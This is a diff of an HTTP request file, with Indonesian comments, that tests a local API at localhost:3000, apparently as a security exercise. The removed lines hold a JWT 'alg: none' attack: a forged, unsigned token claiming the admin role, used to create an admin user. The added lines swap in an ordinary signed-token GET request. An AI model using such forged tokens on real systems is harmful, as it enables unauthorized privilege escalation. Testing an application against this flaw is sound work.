@@ -7,20 +7,12 @@ Content-Type: application/json
 {
     "username" : "bob",
     "password" : "password"
-}" : "alice"
 }
 
 ### 2. Menambah User dengan token NONE tanpa signature dan FORGED token role dari user biasa menjadi admin
-POST http://localhost:3000/api/users
-Authorization: Bearer eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyIiwibmFtZSI6ImFsaWNlIiwiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NzQwMTU3NCwiaXNzIjoidXJuOmp3dCJ9.
-Content-Type: application/json
+GET http://localhost:3000/api/articles/1/comments/1
+Authorization: Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsIm5hbWUiOiJCb2IgSm9obnNvbiIsImVtYWlsIjoiYm9iLmpvaG5zb25AZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTY4NzQxNzUzMywiZXhwIjoxNjg3NDIxMTMzfQ.LooTuB4tSy0SGivcO80LN2O6CS7LGTVLEFj0G4535HEg_qfbXPXCoNbuy_P7jEFs
 
-{
-    "username" : "hackings",
-    "email" : "email@hacking.com",
-    "password" : "hacking",
-    "role" : "admin"
-}
 
 
 
